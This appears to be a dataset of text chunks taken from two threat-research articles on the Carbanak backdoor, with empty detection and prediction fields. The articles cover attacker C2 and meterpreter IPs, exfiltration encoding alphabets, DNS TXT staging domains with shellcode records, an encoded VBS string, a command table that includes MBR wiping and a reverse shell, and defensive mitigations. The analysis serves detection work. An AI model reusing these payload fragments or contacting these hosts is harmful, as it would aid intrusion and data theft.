        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The files are updated as illustrated in the following figure:\n\nAfter the files are updated, the new versions of the VBS files are executed to provide the new functionality.\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The INI processing script communicates with the attacker's CnC server after checking the victim's proxy settings via examination of this Registry key:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable\nThe attacker's CnC IP address is hardcoded into the VBS file:\nhxxp://198.100.119.6:80/cdhxxp://198.100.119.6:443/cdhxxp://198.100.119.6:8080/cd\nThis IP address is managed by GorillaServers, Inc.\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For the exfiltration method, the malware uses \"http POST\" to send data that has been retrieved/stolen from the infected system to the CnC server.\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Information is sent using randomized variable names and simple encryption on the text-based data using base64 encoding and substitution encryption with these alphabets:\nalfIn  = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"alfOut = \"860vFjbqCRty2BUrpAGkEMLVKYJ971eNDThfilxugP5WHOSsnm3QIcdZwX4oza\"\nFor example, to exfiltrate the string \"Windows7\" the following occurs:\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Step [1]: Convert \"Windows7\" to base64: \"V2luZG93czc=\"\nStep [2]: Add \"V2luZG93czc=\" to exfiltration message: \"info%SEPR%V2luZG93czc=\"\nStep [3]: Convert \"info%SEPR%V2luZG93czc=\" to base64: \"aW5mbyVTRVBSJVYybHVaRzkzY3pjPQ==\"\nStep [4]: Encrypt \"\" using alfIn and alfOut:\n&nbsp;&nbsp;&nbsp; <a>&nbsp; Get symbol to convert. Example: \"a\"\n&nbsp;&nbsp;&nbsp; <b> Look up index value of symbol in alfIn. Example: alfIn[26] = \"a\" (see red input symbol above)\n&nbsp;&nbsp;&nbsp; <c> Substitute symbol from alfOut at same index. Example: alfOut[26] = \"J\" (see red symbol above)\n&nbsp;&nbsp;&nbsp; <d>",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For any input symbol not found in alfIn, just add symbol to output as is.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[5]: URL encode \"JLXx93MkAM6GRMK39qMJAQiQKZPfrp==\" into &nbsp;\"JLXx93MkAM6GRMK39qMJAQiQKZPfrp%3D%3D\"\nThis information, along with other items, such as encoded and encrypted IDs based on the hard-drive serial number and the software version of the malware, are bundled into various \"parameter=value\" strings and sent to the CnC sever.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[a-z]{1,2}[a-z0-9]{1,6} and there are also random data strings generated and transmitted (presumably to confuse anyone decoding them) that correspond to the regular expression [a-z0-9]{1,8}.\n Here is information from my own analysis system that is gathered by the malware and transmitted:\nCUID: sn = 907316415Encoded sn = OTA3MzE2NDE1id_b = 1-1-OTA3MzE2NDE1CompInfo():outData =OS Name: Microsoft Windows 10 Pro|C:\\WINDOWS|\\Device\\Harddisk1\\Partition1Version: 10.0.14393Service Pack: 0.0OS Manufacturer: Microsoft CorporationWindows Directory: C:\\WINDOWSLocale: 0409Available Physical Memory: 30120564Total Virtual Memory: 38472844Available Virtual Memory: 34617616OS Name: 4980736System Name: JLA-FORENSICSSystem Manufacturer: Dell Inc.System Model: Precision M4800Time Zone: -300Total Physical Memory: 34295918592Processor System Type: 9Processor: Intel64 Family 6 Model 60 Stepping 3BIOS Version: DELL   - 1072009Perform : 64-bit%UsrNmCmpNmDomNm%Networking informationComputer name : JLA-FORENSICSDomain : jla-forensicsUser name : jantonakos\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "And here we see similar information from a different system on its way to the attacker:\n\nKnowing the format of the messages sent to the attacker may assist in developing alerts for your organizations SIEM, firewall, or other security monitoring tools.\n Lateral Movement Without Passwords\nUnlike previous campaigns, where Mimikatz or some other credential stealer was used, lateral movement between systems is accomplished without user accounts and passwords. Instead, the malware bypasses authentication on the remote system and uses SMB commands (including TreeConnect and Open/Write AndX) to locate a vulnerable host by checking the ability to write data to the C:\\Windows\\Temp folder on a potential victim system. If the write operation is performed, the attacking system writes a short batch file to the victim and runs it remotely via another SMB command (DCERPC).",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The batch file creates a log file whose contents are either \"x86\" or \"amd64\" depending on the bit-size of the operating system on the victim.\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The batch file looks like this:\n\nThe attacking system reads the log file and uses its contents to then transfer a 32-bit or 64-bit executable file to the victim's C:\\Windows\\Temp folder and run it.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The executable acts as a stager and enables the transfer of the meterpreter DLL to the victim system. The meterpreter DLL is made operational via reflective DLL injection, which copies the meterpreter DLL into the memory space of a chosen victim process (such as explorer.exe) and runs it as a thread.\n ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The entire sequence of operations looks like this:\n\nThe {~random} file names are not really random, but instead a base64 combination of the victim's system volume serial number and MAC address, which are obtained by queries to the system's WMI Service.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The IP address 5.149.251.167 is used to enable a reverse_TCP meterpreter shell back to the attacker' system, allowing for complete control over the victim computer. The attacker system at 5.149.251.167 is most likely running a meterpreter listener that transfers an XOR-encrypted meterpreter DLL to the victim and provides the quiet and authentication-free lateral movement between systems the attacker wants.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A total of 606 SMB messages back and forth between the attacking and victim systems are needed to process the 9 infection steps previously described, and takes 105 seconds to complete, as the stager EXE is 59 KB. The stager is one of many that have been created to enable victim-CnC communication using metasploit. The following Wireshark screenshot shows a small portion of the SMB messages that transfer the stager to the victim:\n\nMalware Transfer Via DNS TXT Records\nA PowerShell script created by the infected email attachment contains a base64-encoded block of text that is decoded, written into memory as a thread, and executed. This uses the same technique as the metasploit 'DNS TXT Record Payload Download and Execution' module, as described below (with slightly modified code):\n\nThis code performs DNS queries to the attacker's malware domain, as illustrated here:\n\n A 255-character TXT record is received in response to each query.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For example, a query to:\naaa.stage.3553299.s1.rescsovwe.com\nreturns the TXT record:\nWYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIljHs0wpwpuPjK0NaMlK1UePLycWrOU72ONcyUva4yhHd5iaLCKuWsaE6QzVP1ioTqKkCVnkClduUPNY51U1gpUP5i8KbTVCTq9PeakbLHhZk0XjBaK9zpiQ9p7t4qIBk8IjK0ZJW17q8PnhaTEmc0os9WEQosIVfbhkhM68ioYp8hnMyoYoIoAAgogoENFKOIAAAAAAAAF\nThe next query is to subdomain baa, which returns:\nLFCEFFFIJOFIBMDFCHDAAAAPPNDIJMDFHGIAEAAAAAAFAPPNAGIPALFKCFGGIAFAAAAAAFAPPNDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAAAAAAAAOBPLKAOAALEAJMNCBLIABEMMNCBFEGIGJHDCAHAHCGPGHHCGBGNCAGDGBGOGOGPHECAGCGFCAHCHFGOCAGJGOCAEEEPFDCAGNGPGEGFCOANANAKCEAAAAAAAAAAAAAADIDICCBAHMFJEM\nNote that frequency analysis of the symbol distribution in the records may be helpful in generating a rule for detection, as well as also noting if additional systems are performing the same queries. From a detection perspective, it is important to note that the TXT records are specifically requested in the DNS query, as shown here:\n\nThis is not typical DNS behavior.\n As you refer back to the first TXT record you'll see the majority of the symbols are colored differently. You may also notice there are alphanumeric symbols in this portion of the TXT record that do not appear in the remainder of the record, or in fact, in any of the remaining 1,542 TXT records (as the DNS queries cycle through caa, daa, and so on up to zaa, then rolls over to aba, bba, caa, etc. until all the TXT records have been obtained).\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The alphanumeric portion of the first TXT record is alphanumeric shellcode. The advantage of using alphanumeric shellcode is that it flies under the radar of AV and IDS/IPS, even though the ASCII codes associated with the alphanumeric characters represent actual 80x86 opcodes. Here are a few examples:\n\nHere is a portion of the alphanumeric shellcode decoding loop (original alphanumeric shellcode and decoded shellcode):\n\nThe shellcode decodes itself to create more useful and efficient instructions needed to decode the remaining TXT records that contain the payload. The payload is undergoing detailed analysis and additional information will be forthcoming.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Note: a previous Carbanak campaign used this base domain:\naaa.stage.14919005.www1.proslr3.com\nBoth of these DNS malware domains are registered in Russia.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "As with many malware delivery domains, they operate for a short period of time and then are shut down as the attackers move to a different domain.\n Now, consider this: the number of DNS queries to the three-letter subdomains for the malware analyzed in this new campaign is 1,543. That is a very significant number of 255-character TXT records and over 385 KB of encoded characters. In one test the time to perform the 1,543 queries is 214 seconds, or 7 queries per second.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Security analysts would agree that this clearly indicates a human was not sitting at a computer rapidly clicking links for over three minutes straight.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Recognizing this type of behavior is a valuable addition to an organization's malware alerting controls. A continuous stream of DNS queries from the same system to the same TLD exceeding 420 queries per minute or some similar threshold would be a suitable alerting mechanism (not for a busy server perhaps but certainly for a user workstation).\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The Carbanak malware writers have used several methods to hide the functionality of their malware.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Consider all of these steps required to fully deliver just one of the malware files in this campaign:\n\nPowerShell script file created from base64 encoded string hidden in malicious Word document.\n Decoding the final PowerShell script requires three levels of decoding.\n The final PowerShell file contains a base64 encoded string representing 80x86 machine code that implements a DNS TXT record exploit, and is loaded into RAM and executed.\n Alphanumeric shellcode and encoded payload are obtained via DNS TXT records.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Alphanumeric shellcode contains an initial decoding stub that XOR decrypts a portion of the shellcode into the payload decoder.\n The payload decoder uses the remaining TXT record data to create an in-memory DLL file, thus ensuring that this attack does not leave malware traces on the system itself, only in memory.\n\n The operation of the payload decoder is very simple: Each pair of ASCII characters become a single byte of code in the final payload. As shown in the following figure, each ASCII code in a pair has 'A' (0x41) subtracted from them.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The resulting difference is always between 0 and F and becomes the high-order or low-order nibble of the final payload byte.\n\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In addition to the base64 encoding, other files are also encoded and obfuscated. For example, the script updater is initially created by decoding a base64 string.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "But looking into the file shows these two encoded and obfuscated sections:\n\n\nTake a moment to examine the symbols in the string that represents the encoded VBS statements.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Then look at the symbols in the decoding key, and perhaps you'll see where I am headed.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If you missed it, take a look here:\n\nOnly the first 16 symbols in the decoding key are used to decode the VBS statements string. The second group of 16 symbols do not appear anywhere in the VBS statements string.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In fact, the only place all those symbols appear is in a second encoded string that is at the end of the encoded and obfuscated VBS file, and this string is not referenced or processed. Decoding the string results in binary mumbo-jumbo and the purpose of this unused string is not known at this time.\n If you are a \"code talker\" and want to give the second string a go, here it is:\n\"h8u74y828mcd89t7o3n5rr2i8uyyai1o5wih80suwavtfzu2aszcqsnltmijv22sa0ti/\"_&\"9fhpd9ccjslgo3i2zgwrio8ot7w0ouarnauyh5ornfflamdyrmm7q1r2sypvm220rgv/\"_&\"c9o90ivp2o3qeo45jyinmzc3rp3fzp1p9nrpsncd4og2tl0yt1s3f2o7s5n3y9i4c/\"_&\"514wg5owsscyjp3mr1an2h33yg5zfgp7rssejd3nmy787m8gh011inoe4ho7tgl4ypzm9/\"_&\"u9w9yrnu1z158l59ozrryln0wdeslmj7mc1ugjwc32t1c5d0j1u4tr1v2a24zuvivg/\"_&\"5solssu4qr8woavp3wyz4hrwjfoisu3zrr5lph4vftul2zi5mtmnh0ssl9maa4pmd7oyya/\"_&\"q0rhm1mnrhzde2rmulasifdnho7qzf0l4vp0pa392j439ljcfwg5wd2fai9f40ohgd/\"_&\"i33qhaqmoc1n8svjswzuw4had8cwuocg3eqo2vrwv832o17jn7wyzp0oaplntjlwpgayu/\"_&\"icle7mrmr0cgyz4cyyr7poodefeam2rflfjzhjznstuyan0v1ojf7og1nnup5m2dltst3s5r/\"_&\"w111uv0wqz0h770devyygv895wjgz4vlc25l4lp4v0m47jcru28n808moil9g2iyajc/\"_&\"gy9j9vj0jjdy1yvhmynruqh1j29rfugw3hwdyrqinai8tvavzmqidhwo3c4zluypo3u/\"_&\"l8vg470m1hyp7dhjyqamqrc9owg9sjup99w9rnvgggpfhpvhfaileyuoq4wr0mozdc/\"_&\"jjdg830wiafscumvcw3flyfj3nsliwahtu8a3y4pugpd9aq95r4lc7lg1azl9fgf3umu0s28i2u4/\"_&\"g32pdv8lzhs4ny3rt5i3ir8vc22zo3iifyil77qncc3pthigrac01ge35229jy88dmh8je/\"_&\"f2ohgefdy7g9pthifu2ia0vgh31dzpq9mi598ras14cf745y8jp19rpoofy2wd2dn12vltwwv/\"_&\"syf27jq7ttlpleafv340n8imonfh1himrprjg9gjozluscrghgzouuh9td91cclrtr0v3/\"_&\"\"\nThe deobfuscated decoder looks like this:\n\nThe obsPayload1 variable is set equal to the long encoded string representing the actual VBS statements.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Leaving the VBS files encoded like this while they reside on disk is an attempt to prevent detection by AV scans looking for suspicious keywords.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Watch The Compromise Unfold\nIf you have access to CarbonBlack, the chain of events and spawned processes can be traced from the moment the malicious Word document is opened. Here is a timeline of an actual compromise:\n\nSo, based on the available event sequence, we can identify IoCs as well as the way to detect and/or prevent actions we do not want taking place.\n Organizational Preparedness\nThere are several steps an organization can take to prevent or limit the severity of a Carbanak attack. All of the following steps apply and can be achieved via internal security engineering or by engaging an MSSP:\n\nRegular security awareness training for all employees, paying particular attention to spear phishing.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Spear phishing exercises where employees are sent a 'phishing' email that points to a site controlled by IT (Trustwave SpiderLabs also offers this service).\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "An email server or appliance that can assist with malware detection, such as scanning incoming email attachments for base64 strings.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Macros disabled by default on all Office applications (although a user can still re-enable them).\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A SIEM or other log-and-event aggregation system that allows aggregated network traffic to be examined by an expert security team before, during, and after an attack.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Threat intelligence driven software restriction policies, such as preventing program execution from C:\\Windows\\Temp.\n Whitelist PowerShell scripts and VBS scripts used by the organization and blacklist all others.\n Continuous DNS monitoring with threshold alerts for systems issuing excessive DNS queries in a given period of time.\n Restrict DNS traffic so that internal systems are only able to query your DNS servers.\n\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the vast world of cybersecurity, as technologies evolve, so do the methods attackers employ to compromise systems.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "One such intriguing method that recently surfaced is MySQL servers, leveraging...\nRead More\n\n\nTrustwave SpiderLabs Report:",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "the Manufacturing Sector\nAs the manufacturing sector continues its digital transformation, Operational Technology (OT), Industrial Control Systems (ICS), and Supervisory Control and Data Acquisition (SCADA) are becoming...\nRead More\n\n\nOverview of the Cyberwarfare used in Israel \u2013 Hamas War\nOn October 7, 2023, the Palestinian organization Hamas launched the biggest attack on Israel in years, resulting in numerous casualties and hostages taken. Israel responded with a large-scale ground...\nRead More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                  Stay Informed\n                \n\n\n\n\n\n                  Sign up to receive the latest  security news and trends straight  to your inbox from Trustwave.\n                \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Leadership Team\nOur History\nNews Releases\nMedia Coverage\n\n\n\n\n\n\nCareers\nGlobal Locations\nAwards & Accolades\nTrials & Evaluations\n\n\n\n\n\n\nContact\nSupport\nSecurity Advisories\nSoftware Updates\n\n\n\n\n\n\n\n\n    \n\n\n\n  \n\n\n\n  \n\n\n\n   \n\n\n\n\n\n\n\n\n\n\nLegal\nTerms of Use\nPrivacy Policy\n\n\n\n\n\n\nCopyright \u00a9 2023 Trustwave Holdings, Inc.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\n\nBehind the CARBANAK Backdoor | Mandiantmandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology. Explore the platformarrow_forward Start with free account   Attack Surface Management Free\u00a0Subscription Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Free\u00a0Subscription Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services. Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward   Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Create a free accountSign in to Advantage  en  expand_more   English Fran\u00e7ais Deutsch Italiano \u65e5\u672c \ud55c\uad6d\uc5b4 Espa\u00f1olStart for Free        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewBreach Analytics for ChronicleSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Gives BackNoteholder and Preferred Shareholder DocumentsMobile Footer SectionSee what\u2019s new at MandiantGet startedIncident Response HelpContact SalesSupportSign InCreate a Free Mandiant Advantage AccountTop Incident Response Contact sales Support Advantage Free Trial \u00a0BlogSupportContact usreport_problemIncident Response Assistance    Breadcrumb Home Behind the CARBANAK Backdoor   Threat Research Behind the CARBANAK BackdoorJames T. Bennett, Barry Vengerik Jun 12, 201714 min\u00a0read |\u00a0\u00a0  Last updated: Nov 25, 2022 MalwareIn this blog, we will take a closer look at the powerful, versatile backdoor known as CARBANAK (aka Anunak).",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Specifically, we will focus on the operational details of its use over the past few years, including its configuration, the minor variations observed from sample to sample, and its evolution. With these details, we will then draw some conclusions about the operators of CARBANAK.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For some additional background on the CARBANAK backdoor, see the papers by Kaspersky and Group-IB and Fox-It. Technical AnalysisBefore we dive into the meat of this blog, a brief technical analysis of the backdoor is necessary to provide some context.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Some of its capabilities include key logging, desktop video capture, VNC, HTTP form grabbing, file system management, file transfer, TCP tunneling, HTTP proxy, OS destruction, POS and Outlook data theft and reverse shell.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Most of these data-stealing capabilities were present in the oldest variants of CARBANAK that we have seen and some were added over time.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Monitoring ThreadsThe backdoor may optionally start one or more threads that perform continuous monitoring for various purposes, as described in Table 1. \u00a0 Thread NameDescriptionKey loggerLogs key strokes for configured processes and sends them to the command and control (C2) serverForm grabberMonitors HTTP traffic for form data and sends it to the C2 serverPOS monitorMonitors for changes to logs stored in C:\\NSB\\Coalition\\Logs and nsb.pos.client.log and sends parsed data to the C2 serverPST monitorSearches recursively for newly created Outlook personal storage table (PST) files within user directories and sends them to the C2 serverHTTP proxy monitorMonitors HTTP traffic for requests sent to HTTP proxies, saves the proxy address and credentials for future useTable 1: Monitoring threadsCommandsIn addition to its file management capabilities, this data-stealing backdoor supports 34 commands that can be received from the C2 server. After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line. The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Command HashCommand NameDescription0x0AA37987loadconfigRuns each command specified in the configuration file (see the Configuration section).0x007AA8A5stateUpdates the state value (see the Configuration section).0x007CFABFvideoDesktop video recording0x06E533C4downloadDownloads executable and injects into new process0x00684509ammyyAmmyy Admin tool0x07C6A8A5updateUpdates self0x0B22A5A7\u00a0Add/Update klgconfig (analysis incomplete)0x0B77F949httpproxyStarts HTTP proxy0x07203363killosRenders computer unbootable by wiping the MBR0x078B9664rebootReboots the operating system0x07BC54BCtunnelCreates a network tunnel0x07B40571adminkaAdds new C2 server or proxy address for pseudo-HTTP protocol0x079C9CC2serverAdds new C2 server for custom binary protocol0x0007C9C2userCreates or deletes Windows user account0x000078B0rdpEnables concurrent RDP (analysis incomplete)0x079BAC85secureAdds Notification Package (analysis incomplete)0x00006ABCdelDeletes file or service0x0A89AF94startcmdAdds command to the configuration file (see the Configuration section)0x079C53BDrunmemDownloads executable and injects directly into new process0x0F4C3903logonpasswordsSend Windows accounts details to the C2 server0x0BC205E4screenshotTakes a screenshot of the desktop and sends it to the C2 server0x007A2BC0sleepBackdoor sleeps until specified date0x0006BC6CduplUnknown0x04ACAFC3\u00a0Upload files to the C2 server0x00007D43vncRuns VNC plugin0x09C4D055runfileRuns specified executable file0x02032914killbotUninstalls backdoor0x08069613listprocessReturns list of running processes to the C2 server0x073BE023pluginsChange C2 protocol used by plugins0x0B0603B4\u00a0Download and execute shellcode from specified address0x0B079F93killprocessTerminates the first process found specified by name0x00006A34cmdInitiates a reverse shell to the C2 server0x09C573C7runplugPlugin control0x08CB69DEautorunUpdates backdoorTable 2: Supported CommandsConfigurationA configuration file resides in a file under the backdoor\u2019s installation directory with the .bin extension.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It contains commands in the same form as those listed in Table 2 that are automatically executed by the backdoor when it is started. These commands are also executed when the loadconfig command is issued.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The state command sets a global variable containing a series of Boolean values represented as ASCII values \u20180\u2019 or \u20181\u2019 and also adds itself to the configuration file.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Some of these values indicate which C2 protocol to use, whether the backdoor has been installed, and whether the PST monitoring thread is running or not.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Other than the state command, all commands in the configuration file are identified by their hash\u2019s decimal value instead of their plain text name.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Certain commands, when executed, add themselves to the configuration so they will persist across (or be part of) reboots. The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it. Figure 1 and Figure 2 illustrate some sample, decoded configuration files we have come across in our investigations. Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use itFigure 2: Configuration file that adds TCP tunnels and records desktop videoCommand and ControlCARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol. Pseudo-HTTP ProtocolMessages for the pseudo-HTTP protocol are delimited with the \u2018|\u2019 character.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A message starts with a host ID composed by concatenating a hash value generated from the computer\u2019s hostname and MAC address to a string likely used as a campaign code. Once the message has been formatted, it is sandwiched between an additional two fields of randomly generated strings of upper and lower case alphabet characters.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "An example of a command polling message and a response to the listprocess command are given in Figure 3 and Figure 4, respectively. Figure 3: Example command polling messageFigure 4: Example command response messageMessages are encrypted using Microsoft\u2019s implementation of RC2 in CBC mode with PKCS#5 padding.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The encrypted message is then Base64 encoded, replacing all the \u2018/\u2019 and \u2018+\u2019 characters with the \u2018.\u2019 and \u2018-\u2019 characters, respectively.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The eight-byte initialization vector (IV) is a randomly generated string consisting of upper and lower case alphabet characters.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is prepended to the encrypted and encoded message. The encoded payload is then made to look like a URI by having a random number of \u2018/\u2019 characters inserted at random locations within the encoded payload.",
        "source": "Behind the CARBANAK Backdoor _ Mandiant.html",
